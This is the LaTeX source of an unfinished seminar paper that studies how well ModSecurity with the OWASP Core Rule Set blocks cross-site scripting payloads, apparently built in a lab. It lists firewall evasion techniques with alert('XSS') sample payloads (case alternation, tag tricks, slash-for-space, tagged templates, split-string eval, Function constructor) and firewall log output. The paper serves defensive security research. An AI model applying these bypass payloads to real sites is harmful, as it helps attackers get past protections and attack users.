% Autor der Vorlage: Dominik Auracher
\documentclass[11pt, bibliography=numbered, headsepline, numbers=withenddot]{scrartcl}

% Paket für Abkürzungsverzeichnis
\usepackage[acronym, automake=delayed, nopostdot]{glossaries}
% Neue Abkürzung definieren (Sortierung egal)
% Aufbau: \newacronym{label-for-the-text}{short-version}{long-version}
\newacronym{owa}{OWA}{Outlook Web App}
\newacronym{test}{TEST}{T E S T}
\newacronym{so}{SO}{SOLUTION}
\newacronym{waf}{WAF}{Web Application Firewall}

\makeglossaries

% Allgemeine Informationen
\renewcommand{\author}{\color{red}Vorname Nachname} % Autor
\newcommand{\jury}{\color{red}Prüfungskomitee} % Prüfungskomitee
\newcommand{\location}{\color{red}München} % Ort, an welchem die Arbeit geschrieben wurde
\newcommand{\matriculationnumber}{\color{red}123456} % Matrikelnummer
\newcommand{\submissiondate}{\color{red}\today} % Datum der Abgabe
\newcommand{\supervisor}{\color{red}Betreuer} % Betreuung
\renewcommand{\title}{\color{red}Titel der Arbeit} % Titel der Arbeit

% Macro für Anführungsstriche
% Verwendung: \quotes{Text} -> Resultat: "Text"
\newcommand{\quotes}[1]{``#1''}

% WICHTIG:
% Bei erstmaliger Einrichtung TeXstudio -> TeXstudio konfigurieren -> Optionen -> Erzeugen -> "Standard Bibliographieprogramm" = "Biber" setzen!
\usepackage[a4paper, left=2.5cm, top=3cm, right=3cm, bottom=2.75cm]{geometry}

% Paket zur eigenen Darstellung der Kopf-/Fußzeilen
\usepackage[automark]{scrlayer-scrpage}
\clearscrheadfoot
\setlength{\headheight}{1.27cm}
\setlength{\footheight}{1.27cm}

% Paket zur Ermittlung der letzten Seite
\usepackage{lastpage}

% Paket für Deutschsprachige Inhalte
\usepackage[ngerman]{babel}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[babel, german=quotes]{csquotes}

% Paket für Quellcode-Anzeige (auch Inline!)
\usepackage{listings}

% Paket für Auflistungen
\usepackage[inline]{enumitem}

% Paket für Grafiken
\usepackage{graphicx}

% Paket für Farbgebungen
\usepackage{xcolor}

% Quellenverwaltung
\usepackage[backend=biber, style=alphabetic, isbn=false, hyperref=true]{biblatex}
\addbibresource{literature.bib}
%\DeclareFieldFormat*{title}{#1}            % Format for bibliography
\DeclareFieldFormat*{citetitle}{#1}        % Format for citations

% Paket, welches das Jahr zusätzlich in die Fußnote aufnehmen kann
\usepackage{xpatch}
\xapptobibmacro{cite}{\setunit{\nametitledelim}\printfield{year}}{}{}

% Paket und Konfiguration für Zahlen
\usepackage[locale=DE]{siunitx}
\sisetup{per-mode=fraction}

% Paket und Konfiguration für Schriftart
% Zur Verwendung von Arial, TeXstudio konfigurieren: Optionen -> TeXstudio konfigurieren -> Optionen -> Erzeugen -> "Standardcompiler" = "XeLaTeX" setzen!
% \usepackage{fontspec}
% \setmainfont{Arial}
% \setsansfont{Arial}

% Wichtig: Als letztes Paket laden!
\usepackage{hyperref}
\hypersetup{
	colorlinks=false,
	allbordercolors=white
}

% Neu-Definition der Namen
\renewcommand{\sectionautorefname}{Abschnitt}
\renewcommand{\subsectionautorefname}{Abschnitt}
\renewcommand{\subsubsectionautorefname}{Abschnitt}
\renewcommand{\figureautorefname}{Abb.}
\renewcommand{\tableautorefname}{Tab.}
\renewcommand{\listoflofentryname}{Abb.}

% Zeilenabstand einstellen
\renewcommand{\baselinestretch}{1.25}

\begin{document}
	%config
	% code listing config
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
\lstdefinestyle{ruleStyle}{
	backgroundcolor=\color{backcolour},
	commentstyle=\color{codegreen},
	keywordstyle=\color{magenta},
	numberstyle=\tiny\color{codegray},
	stringstyle=\color{codepurple},
	identifierstyle=\color{blue},
	rulecolor=\color{black},
	basicstyle=\ttfamily,
	breakatwhitespace=false,
	breaklines=true,
	captionpos=b,
	keepspaces=true,
	numbers=left,
	showspaces=false,
	showstringspaces=false,
	showtabs=false,
	tabsize=2,
	frame=single,
	morekeywords={test, do, <file>},
	aboveskip=1\baselineskip,
	escapeinside=\^\^
}

\lstdefinestyle{basicStyle}{
	backgroundcolor=\color{backcolour},
	commentstyle=\color{codegreen},
	numberstyle=\tiny\color{codegray},
	stringstyle=\color{codepurple},
	rulecolor=\color{black},
	basicstyle=\ttfamily,
	breakatwhitespace=false,
	breaklines=true,
	captionpos=b,
	keepspaces=true,
	numbers=left,
	showspaces=false,
	showstringspaces=false,
	showtabs=false,
	tabsize=2,
	frame=single,
	aboveskip=1\baselineskip
}


	% Deckblatt
	\begin{titlepage}
	\centering
	\includegraphics[width=0.8\textwidth]{"General/HDBW_Logo_large.png"}
	\vfill
	{\LARGE\bfseries Seminararbeit\par}
	\vspace{1cm}
	{\Large\bfseries \title\par}
	\vfill
	{\Large vorgelegt von:\par}
	{\Large\bfseries \author\par}
	{\Large (Matrikelnummer: \matriculationnumber)\par}
	\vfill
	\begin{tabular}{ll}
		vorgelegt am: & \submissiondate\\
	\end{tabular}
	\par
	\begin{tabular}{ll}
		Prüfer: & \jury\\
		Betreuung: & \supervisor\\
	\end{tabular}
\end{titlepage}

	\newpage

	% Kopf-/Fußzeilen ab 2. Seite
	\renewcommand*\sectionmarkformat{}% keine Nummerierung im Kopf
	\renewcommand*{\headfont}{\normalfont} % Nicht kursiv	
	\rohead*{\includegraphics{"General/HDBW_Logo_small.png"}}
	\lofoot*{\scriptsize \submissiondate}
	\rofoot*{\scriptsize Seite \thepage\ von \pageref{LastPage}}
	
	% Eidesstattliche Erklärung
	\lohead*{Eidesstattliche Erklärung}

\section*{Eidesstattliche Erklärung}
\label{sec:Eidesstattliche Erklärung}
Hiermit versichere ich, dass die vorliegende Arbeit ohne Hilfe Dritter und nur mit den angegebenen Quellen und Hilfsmitteln angefertigt wurde. Alle verwendeten Passagen wurden kenntlich gemacht. Diese Arbeit hat in gleicher oder ähnlicher Form noch keiner Prüfungsbehörde vorgelegen.
\newline
\newline
\newline
\newline
\author
\newline
\location, \submissiondate

	\newpage
	
	% Zusammenfassung
	\color{black}
	\lohead*{Zusammenfassung}

\section*{Zusammenfassung}
\label{sec:Zusammenfassung}
Kurze \gls{test} Zusammenfassung der wichtigsten \gls{test} Inhalte

	\newpage
	
	% Kopf-/Fußzeilen ab 4. Seite
	\lohead*{\headmark}
	
	% Inhaltsverzeichnis
	\tableofcontents
	\newpage
	
	% Abkürzungsverzeichnis
	\printglossary[type=\acronymtype,title={Abbreviations},style=tree,nonumberlist]
	
	% Abbildungsverzeichnis
	\listoffigures
	
	% Tabellenverzeichnis
	%\listoftables
	
	% Quellcode-Verzeichnis
	\lstlistoflistings
	\newpage
	
	% --- INHALT ---
	\section{Introduction}
The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications. \cite{OWASP/Top10} In the two most recent editions, OWASP Top 10 2017 Edition and OWASP Top 10 2021 Edition, among others, the top 1 security risk is a risk that developers seek to mitigate by employing a web application firewall. \cite{OWASP/Risks2017,OWASP/Risks2021} Injection (OWASP top 1 risk of 2017) vulnerabilities as well as Broken Access Control (OWASP top 1 risk of 2021) vulnerabilities can both be exploited using malicious HTTP requests. \cite{OWASP/Injection,OWASP/BrokenAccessControl}

In a perfect scenario, a web application firewall would filter, detect and block those malicious requests while at the same time allowing standard application traffic to reach the web application. For some web application firewalls, the filtering behaviour can be configured with a set of rules that define which requests are going to be blocked by the firewall. \cite{OWASP/CRS,wargio/naxsiRules,Cisco/SnortRulesDocs}
When employing a web application firewall, it is mandatory to set up the rules in a way where a maximum of potentially malicious requests gets blocked while allowing all intended application traffic. This set up requires a balancing act of indentifying and defining standard request patterns as well as malicious request patterns. Both identification tasks are non trivial. Some web application firewalls come with a standard set of rules that aim to protect a web application from a wide range of attacks while allowing for a minimal rate of false positives. \cite{OWASP/CRS,wargio/naxsiRules,Cisco/SnortRulesDownload}

Antagonist actors aimed at exploiting vulnerabilities of such a protected web application need to try and make their malicious HTTP requests bypass the web application firewall. To bypass a web application firewall, firewall evasion techniques are being used. \cite{HackTricks/WAFBypass} With firewall evasion techniques in mind, the question arises: 
\begin{quote} "How well can web application firewalls in their generic standard configuration protect a web application against targeted malicious requests?" 
\end{quote}
This question will be discussed in more detail first.

	\section{Theoretical fundamentals}
\label{sec:fundamentals}
The context around firewall evasion covers web applications, web application security and common vulnerabilities in web applications. Web application firewalls to protect against the exploitation of vulnerabilities and firewall evasion techniques to bypass web application firewalls.
A subsection devoted to each of these topics is set forth in this chapter.

	\subsection{Web application security and security risks}
According to synopsys, the concept of \quotes{Web Application Security}
\begin{quote}
	involves a collection of security controls engineered into a Web application to protect its assets from potentially malicious agents. Web applications, like all software, inevitably contain defects. Some of these defects constitute actual vulnerabilities that can be exploited, introducing risks to organizations. Web application security defends against such defects. It involves leveraging secure development practices and implementing security measures throughout the software development life cycle (SDLC), ensuring that design-level flaws and implementation-level bugs are addressed.
\end{quote}
Developers and publishers of Web applications are leveraging secure development practices to prevent security risks like those specified in the OWASP Top 10 document.
The OWASP Top 10 standard awareness document for developers and web application security represents a broad consensus about the most critical security risks to web applications.
It includes security risks based on vulnerabilities that could be exploited using malicious HTTP requests.
\cite{OWASP/Top10}

Broken Access Control is the top 1 security risk in the OWASP Top 10 list from 2021.
Broken Access Control enables users to act outside of their intended permissions.
Examples include access to undisclosed information, modification or destruction of data and performing business functions outside the users limits.
OWASP mentiones an attack scenario on an Web application with broken access control where the attacker force browses to target URLs. \cite{OWASP/BrokenAccessControl,OWASP/Risks2021} Force browsing is described by the OWASP Foundation as follows:
\begin{quote}
	Forced browsing is an attack where the aim is to enumerate and access resources that are not referenced by the application, but are still accessible.

	An attacker can use Brute Force techniques to search for unlinked contents in the domain directory, such as temporary directories and files, and old backup and configuration files. These resources may store sensitive information about web applications and operational systems, such as source code, credentials, internal network addressing, and so on, thus being considered a valuable resource for intruders.

	This attack is performed manually when the application index directories and pages are based on number generation or predictable values, or using automated tools for common files and directory names.

	This attack is also known as Predictable Resource Location, File Enumeration, Directory Enumeration, and Resource Enumeration.
	If the target URL corresponds to an admin page, admin privileges should be required to access the page. \cite{OWASP/forcebrowsing}
\end{quote}
If a user without admin privileges can access the page, the access control is broken.

PhpMyAdmin is a Web application that allows users to manage MySQL databases over the web.
In some cases, the user interface of phpMyAdmin can be accessed via the URL \verb|http://servername/phpmyadmin| after publishing the application via a Web server. Single signon authentication is supported by phpWebAdmin. \cite{phpmyadmin/overview,phpmyadmin/quickinstall,ubuntu/phpmyadmin,phpmyadmin/signon}
The interface of phpWebAdmin is intended to be accessed by an administrative audience.
If a user force browses to the specified URL and this page can be accessed by users without administrative privileges through misconfigured single sign on, it is a case of broken access control.
As an additional security control in this case, a Web application firewall could be used to prohibit any access to the URLs containing the path \verb|/phpmyadmin|.
If database administration is usually done locally, this would suffice.
Alternatively, a whitelist of remote addresses allowed to access \verb|/phpmyadmin| could be used in the Web application firewall configuration.

	%{\color{red} maybe add ssrf here: \\ \verb|https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_\%28SSRF\%29/|}

Injection is the top 1 security risk in the OWASP Top 10 list from 2017.
An application is vulnerable to attack when, among others, user-input is incorrectly validated, sanitized or filtered by the application.
The OWASP Foundation mentiones the common weakness CWE-79: \gls{xss} as one of the weaknesses caused by incorrectly neutralized user-controllable input. \cite{OWASP/Risks2017,OWASP/Injection} \gls{xss} vulnerabilities are described in the \gls{cwe} as follows:
\begin{quote}
	Cross-site scripting (XSS) vulnerabilities occur when:

	Untrusted data enters a web application, typically from a web request.
	The web application dynamically generates a web page that contains this untrusted data.
	During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.
	A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.
	Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.
	This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.

	There are three main kinds of XSS:

	\textbf{Type 1: Reflected XSS (or Non-Persistent)} - The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.

	\textbf{Type 2: Stored XSS (or Persistent)} - The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.

	\textbf{Type 0: DOM-Based XSS} - In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.

	Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."

	In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious. \cite{mitre/XSS}
\end{quote}

As an additional protection mechanism, Web application firewalls can be used to block \gls{xss} payloads in HTTP requests. In Web applications where script code transmission is not part of the business, the rules intended to block requests containing \gls{xss} payloads could be pretty strict.

Cross-site Scripting (XSS) payloads will be the main payloads tested in the proceeding of this work. 
Cross-site Scripting weaknesses represent only a fraction of possible weaknesses in Web applications. Therefore, to achieve a comprehensive understanding of a web applications attack surface, research into further kinds of typical web application weaknesses should be considered.

When employing a Web application firewall as an 'additional protection mechanism', the Defense-in-Depth strategy is followed.
The first layer of defense should be the counter measure inside the Web application, like proper access control and neutralization of user-input. 
An additional layer of defense is then put on top by employing a Web application firewall.
If a misconfigured security control in the Web application failes to correctly handle a specific malicious request, there is a chance that the Web application firewall is configured in a way that detects and blocks the malicious request before it can reach the Web application and cause an incident.
Avoiding security incidents with the Defense-in-Depth strategy corresponds to
\begin{quote}
	the application of multiple countermeasures in a layered or stepwise manner to achieve security objectives. The methodology involves layering heterogeneous security technologies in the common attack vectors to ensure that attacks missed by one technology are caught by another.
\end{quote}
as defined by the National Institute of Standards and Technology (NIST). \cite{nist/did}


	\subsection{Web Application Firewall}
In contrast to network firewalls based on IP packet filtering, which operate on layers 3 and 4, a web application firewall is a firewall acting on the application layer.

Users interact with a Web application using their Web browser.
After instructing the browser to show resources identified by a URI according to the http or https URI Schemes, the Web browser will initiate opening TCP connections to the designated open port on the Web server hosting the Web application.
Usually the well-known default ports 80 for HTTP connections and 443 for HTTPS connections are being used.
The TCP connections are used to transport the datagrams of the HTTP connections on the application layer. \cite{rfc7230}
The Web server and any intermediary gateways inspecting layers 3 and 4 will see open TCP connections initiated from uncontrolled source IP addresses and ports towards the designated destination port and IP address of the Web server.
From the perspective of an IP packet filtering firewall, all requests towards the Web application look similar in this sense.
In this configuration, IP packet filtering firewalls can accomplish tasks like rate limiting of incoming connections, among others.
However, they can not prevent the exploitation of vulnerabilites in the Web application.
Injection vulnerabilities are exploited using HTTP requests with malicious payloads on the application layer.
As the IP packet filter firewall exclusively looks at the packets contents corresponding up to the transport layer (session layer in case a stateful firewall is used), the HTTP payloads from the application layer remains unseen.
To detect and block malicious HTTP requests, a firewall would therefore need to inspect the messages on the application layer. Firewalls inspecting the application layer in a Web application context are called Web application firewalls.

Web application firewalls apply a set of rules to an HTTP conversation.
These rules determine which traffic is malicious and which traffic is safe.
The Web application firewall acts as a reverse proxy, an intermediary between client and server that receives, filters and forwards all incoming and outgoing HTTP messages. \cite{OWASP/waf,f5/waf}

Messages originating from a client are first received by the web application firewall.
At this point, the configured filtering rules are applied and a decision is made if the message is to be forwarded or rejected.
If the message is considered benign, the web application firewall forwards the message to the server hosting the web application.
If the message is considered malicious, the web application rejects the message.
In the case of rejection, the web application will never receive the malicious message and it will stay unaffected by the malicious payload.

HTTP answers originating from a server hosting a web application are also first received by the web application firewall.
There, rules for outgoing HTTP messages are applied.
If the content of an HTTP answer is unusual in comparison to the usual outgoing traffic, a rule might match and deny the client from receiving the HTTP answer.

Configuring the web application firewall with which rules to apply to incoming and outgoing traffic requires a balancing act between security and false positives.
When a genuine HTTP message causes a rule to match, it is described as false positive.
A stricter ruleset provides more security, but the risk of false positives increases as well.
The contributors to the OWASP Core Rule Set, which is a generic rule set used by a web application firewall to protect any web application, provide instructions on false positives:

\begin{quote}
	When a genuine transaction causes a rule from the Core Rule Set to match in error it is described as a false positive. False positives need to be tuned away by writing rule exclusions, [...]

	The Core Rule Set provides generic attack detection capabilities. A fresh CRS deployment has no awareness of the web services that may be running behind it, or the quirks of how those services work. It is possible that genuine transactions may cause some CRS rules to match in error, if the transactions happen to match one of the generic attack behaviors or patterns that are being detected. Such a match is referred to as a false positive, or false alarm. \cite{OWASP/crsfpt}
\end{quote}

Rules can be configured in a blacklisting setting or in a whitelisting setting.
When configuring rules in a whitelisting setting, every possible benign message towards or originating from the Web application needs to be predictable. 
With this prediction of requests, rules are configured in such a way that they match on the predicted messages. 
Then the Web application firewall is configured to deny all messages that do not match on any rule. 
In this setup, the rules act as a whitelist of allowed messages. Unknown and possibly malicious messages are denied by default.
When configuring rules in a blacklisting setting, the setup is reversed. 
An effort is made to predict possible malicious messages towards the Web application as well as uncommon messages originating from the Web application.
Rules are configured to match on these predictions and the Web application firewall is instructed to reject messages that trigger matches on rules. 
In this setup, the rules act as a blacklist of rejected messages. Unknown and possibly benign messages are allowed by default.

Web application firewalls can be deployed network-based in the form of an hardware appliance, cloud-based integrated with virtual cloud networking services and host-based colocated on the servers where the web applications reside. \cite{palo/waf}
An example of a host-based Web application firewall is the open-source Libmodsecurity Web application firewall engine.
It provides the capability to interpret rules written in the ModSecurity SecRules format and apply them to HTTP content provided by an application via connectors.
The library is consumed by these connectors that interface with web servers and provide the library with a commmon format.
The ModSecurity project provides connectors for nginx and apache web servers.
If nginx is compiled and setup with the ModSecurity connector, it can act as a Web application firewall and reverse proxy. \cite{modsec/home, modsec/nginx}
In this configuration, nginx can be setup to listen for HTTP connections on ports 80 and 443.
Once a request is incoming, it will be passed to the Libmodsecurity library for the application of filtering rules.
If no rule(s) match, the request is forwarded to the Web application. The reversed procedure applies for the response, as mentioned earlier.
For usage with the Libmodsecurity Web application firewall engine, the OWASP Foundation provides the open-source OWASP CoreRuleSet:

\begin{quote}
	The OWASP® (Open Worldwide Application Security Project) CRS (Core Rule Set) is a free and open-source collection of rules that work with ModSecurity® and compatible web application firewalls (WAFs). These rules are designed to provide easy to use, generic attack detection capabilities, with a minimum of false positives (false alerts), to web applications as part of a well balanced defense-in-depth solution. \cite{OWASP/crshome}
\end{quote}

{\color{red} TODO: explain rule setup?}

A similar setup Web application firewall configured with the OWASP CoreRuleSet will be evaluated in the further course of this work.

	\subsection{Firewall Evasion}
Firewall evasion (in general) refers to ...

Web application firewall evasion refers to the action of trying to evade the detection of malicious payloads by the WAF. {\color{red} TODO}


	\section{Evaluation methodology}
\label{sec:evaluation}
To answer the previously mentioned question
\begin{quote} "How well can web application firewalls in their generic standard configuration protect a web application against targeted malicious requests?"
\end{quote}
a gray box evaluation strategy using firewall evasion techniques was developed. The evaluation was conducted inpersonating an attacker persona, much like in black box testing.
In order to evaluate the firewall configuration, an attempt was made to develop firewall evading payloads by following the iterative cycle of sending a request with a malicious payload towards the web application, analyzing the reason(s), why the web application firewall blocked the request, and subsequently modifying the payload accordingly. 
To be more efficient in finding payloads, that evade the filtering of the web application firewall, attention to the firewall logs was paid during the evaluation.

The evaluation was done in two steps. In the first step, the original evaluation-payloads were modified using a single evasion technique. Here, effective evasion techniques against the firewall configuration are identified.
In the second step, multiple evasion techniques were used to modify the original evaluation-payloads. 
The evaluation-payloads in the second step were iteratively modified based on the firewall logs and previously identified effective evasion techniques.
As the firewall logs state the per-request specific matched data and rule that cause the rejection of the request, through analyzing the firewall logs, it is possible to subsequently apply evasion techniques that would circumvent the reason of rejection mentioned in the logs.

Evaluation-payloads sent in requests toward the web application are chosen to supply a proof of concept for a single or a combination of multiple evasion techniques. The validity of all payloads is determined by running them inside FireFox browser version 124.0.1-1. Only valid payloads are considered in the evaluation context. %For a list of all original-payloads, see Listing~\ref{lst:originalpayloads}.
In all requests, the payloads are sent in the request body in JSON format.
To test the validity of payloads, bypassing payloads have been injected into exemplary code snippets with Cross-Site Scripting vulnerabilities. A \acrshort{html} file was used that specified a \verb|<div>| element, which is dynamically modified, and a \verb|<script>| element that imports vulnerable JavaScript code snippets from an adjacent \verb|.js| file. The \acrshort{html} file:

\begin{lstlisting}[style=basicStyle, language=Python, caption=\acrshort{html} file used for payload validation]
<!doctype html>
<html>
<body>
	<div id="div1"></div>
	<script src="./tsc.js"></script>
</body>
</html>
\end{lstlisting}

The \verb|tsc.js| file was modified depending on the payload. If the payload included a complete \acrshort{html} element, the used code snippet was set up to dynamically add the injected payload to the \acrshort{html} document:

\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^, caption=Script used to validate payloads containing full \acrshort{html} elements]
const injection = 
  JSON.parse("{\"body\":\"   ^{\color{red}<injected payload>}^   \"}")

document.getElementById('div1').insertAdjacentHTML('afterbegin', injection.body)
\end{lstlisting}

If the payload was composed of only JavaScript statements to be executed, the injected payload was put inside a template string, such that the JavaScript statements would be executed on page load:

\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^, caption=Script used to validate payloads containing only JavaScript statements]
const injection = 
  JSON.parse("{\"body\":\"   ^{\color{red}<injected payload>}^   \"}")

^{\color{orange}injection.body = decodeURIComponent(injection.body)}^
^{\color{blue}injection.body = injection.body.normalize('NFKC')}^

document.getElementById('div1').insertAdjacentHTML('afterbegin', `<img src=0 onerror=${injection.body}>`)
\end{lstlisting}

Decoding percent encoded payloads and normalizing Unicode characters was done where neccessary, the according statements marked in orange and blue were added in such cases. 

The evaluation has been conducted in a lab environment composed of a simple node.js web server to receive any requests that pass the firewall.
The web server is reachable via a nginx reverse proxy, that is compiled from source with the ModSecurity-nginx connector module. Nginx runs on a Debian Bookworm host with ModSecurity installed.
All components are built from source from their latest mainline branches as of April 2024.
For more details see the Dockerfiles in the attached GitHub repository:\\ \verb|https://github.com/sebstec/mt|. \\

ModSecurity is configured using the authors recommended configuration by the time of this writing. \cite{modsec/recconf}
Adjustments were made, such that hits on potentially malicious requests are logged and the requests are being blocked. The response body is not being filtered.
The configured ruleset to be used is the OWASP CoreRuleSet in version 4.1.0 from 21/03/2024. \cite{crs/410dl}

As mentioned under Section~\ref{sec:waf}, the configured ruleset is responsible for setting up the filtering rules used by the web application firewall. Results of successful filtering bypasses as well as successful filtered requests, while using the OWASP CoreRuleSet in version 4.1, are detailed in the following section, Section~\ref{sec:EvaluationResults}.

	\section{Firewall evasion techniques}

Compatibility with browsers is not being regarded. {\color{red} TODO: check JavaScript versions (ECMA script 6) and write about browser compatibility}
Naturally, when discussing web application firewall evasion, most chosen firewall evasion techniques are covering XSS Payloads.

All techniques are available {\color{red}(at the time of writing)}

\subsection{Various Payloads}

\subsubsection{Payload size}

\subsubsection{Unicode encoding in JSON}
Detected by modsecurity, checked with \u0024 and \u0028

\subsubsection{Case alternation}
In order to evade regex filerting by the WAF, the case of a payload can be alternated. \cite{medium/allypetitt}
Modern regex flavors allow the application of modifiers to parts of the regular expression.
One such modifier is \verb|(?i)|. It makes the regex case insensitive. \cite{regex/jan} Only when this modifier is not used, can a payload evade regex filtering using case alternation. 

Taking the XSS payload \verb|<script>alert('XSS')</script>| as an example, after applying case alternation, it might result in a payload in the form of: \verb|<sCrIpT>alert('XSS')</sCriPt>|.
Another example is file access on a wrongfully public file.
The Windows file system trests file and directory names as case-insensitive by default. \cite{windows/casesensitive}
On a web server hosted on Windows that exposes a .env file with stored secrets, both urls: \\ \verb|http://127.0.0.1:8000/.env| and \verb|http://127.0.0.1:8000/.enV| \\
are treated equally. {\color{blue} verified by the author using the python webserver module on windows 10 [should this be here?]}


\subsection{XSS Payloads}

\subsubsection{Tag modification}
In a case, where regex filters are configured to look for html tags, modifying html tags might make a payload evade the filter. Possible modifications include:
\begin{itemize}
	\item prepending the tag with an additional \verb|<|: \verb|<<script>alert('XSS')</script>|
	\item omitting the closing tag: \verb|<script>alert('XSS')| 
	\item using double open angle brackets: \verb|<iframe src=javascript:alert('XSS') <|
	\item using uncommon tags: \\ \verb|<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE>|
\end{itemize}
Technique by \cite{medium/allypetitt}

\subsubsection{Space replace}
A regex filter that is expecting a space inside a html tag at certain positions can be evaded by replacing the space with a \verb|/|. 
For instance, \verb|<img src=1 onerror=alert('XSS')>| becomes \verb|<img/src=1/onerror=alert('XSS')>|.
Technique by \cite{medium/allypetitt}

\subsubsection{HTML encoding}
see the <a> thing

\subsubsection{String passing}

\subsubsection{Tagged Template Literals}
Tagged Template Literals can be used in JavaScript payloads to avoid detection of JavaScript function calls in an http request. Dr. Alex Rauschmeyer explains Tagged Template Literals in ``Exploring ES6'':
\begin{quotation} Tagged Template Literals are function calls whose parameters are provided via template literals. [...]
	The following is a tagged template literal (short: tagged template):
	\begin{lstlisting}
tagFunction`Hello ${firstName} ${lastName}!`
\end{lstlisting}
	Putting a template literal after an expression triggers a function call, similar to how a parameter list (comma-separated values in parentheses) triggers a function call. The previous code is equivalent to the following function call (in reality, first parameter is more than just an Array, but that is explained later).
	\begin{lstlisting}
tagFunction(['Hello ', ' ', '!'], firstName, lastName)
\end{lstlisting}
	Thus, the name before the content in backticks is the name of a function to call, the tag function.
	\cite{exploringes6/templatelit}
\end{quotation}

As the function \verb|alert| can be called with an array as first parameter, it is possible to substitute the payload with \verb|alert`XSS`|. The substitute payload might evade regex filtering that looks for a function name followed by an opening \verb|(|.
Technique by \cite{onecons/wafbypass}.


\subsubsection{eval() function}
\label{sec:eval}

JavaScript payloads that are being passed in string format can be executed using the eval function. The \verb|eval()| function will evaluate the source string given as an argument and return its completion value. \cite{js/eval}
A possible usecase for \verb|eval()| in the quest to bypass a \gls{waf} is the splitting of function names that would cause a HTTP request to get rejected by the firewall.
Looking at Listing~\ref{lst:alertXSSblocked}, it is clear that the function call \verb|alert('XSS')| is being blocked by the ModSecurity firewall using CRS 4.1.0.
To avoid a match on \verb|alert(|, it is possible to split the function call into parts \verb|al|, \verb|e| and \verb|rt('XSS')| by using string concatenation in the form of \verb|`al` + `e` + `rt('XSS')`|.
Sending the payload in this form will not cause the the desired effect, as a JavaScript interpreter will interpret the payload as a string instead of a function call to the \verb|alert()| function.
Using the \verb|eval()| function in combination with the splitted string solves this problem. Passing the string \verb|`al` + `e` + `rt('XSS')`| in the form of \verb|eval(`al` + `e` + `rt('XSS')`)| as an argument to the \verb|eval()| function will cause the string to be evaluated and interpreted. Technique inspired by \cite{onecons/wafbypass}.
The ModSecurity firewall using CRS 4.1.0. checks for usage of the function \verb|eval()| and tries to block requests containing it. An example is listed in Listing~\ref{lst:evalalertXSSblocked}.

\begin{lstlisting}[style=ruleStyle, language=XML, caption=eval(`al` + `e` + `rt('XSS')`) blocking example, label={lst:evalalertXSSblocked}]
<payload>eval(`al` + `e` + `rt('XSS')`)</payload>
<file>"rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
<fileDetails>[line "331"] [id "933160"]<fileDetails>
<MatchedData>"eval(`al`   `e`   `rt('XSS')"</MatchedData>

<file>"rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"eval("</MatchedData>

<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"eval("</MatchedData>
\end{lstlisting}

\subsubsection{function constructor}
\label{sec:functionconstructor}

When using the function \verb|eval()| (see Section~\ref{sec:eval}) causes a request to be blocked, a substitute in the form of \verb|[].constructor.constructor(`alert('XSS')`)()| is available in JavaScript.

Calling \verb|[]| will create an empty array, which is a special kind of object.
Any kind of object in JavaScript, with the exception of null prototype objects, will have a constructor property on its prototype. \cite{js/object}

The Array objects constructor can be accessed by calling \verb|.constructor| on an instance of Array, like \verb|[].constructor|. \cite{js/array}
Constructors are technically regular functions. \cite{js/constructor}
As such, they are Function objects. Function objects have a constructor themselfes, which again is called using the \verb|.constructor| notation.

Using \verb|[].constructor.constructor| will yield access to the Function() constructor.
Calling the Function() constructor directly can create functions dynamically, similar to using \verb|eval()|.
The difference being that the Function() constructor creates functions that execute in the global scope only.

The Function() constructor takes a variable count of arguments. The first $n - 1$ arguments are the \quotes{names to be used by the function as formal argument names. Each must be a string that corresponds to a valid JavaScript parameter [...]} \cite{js/function}
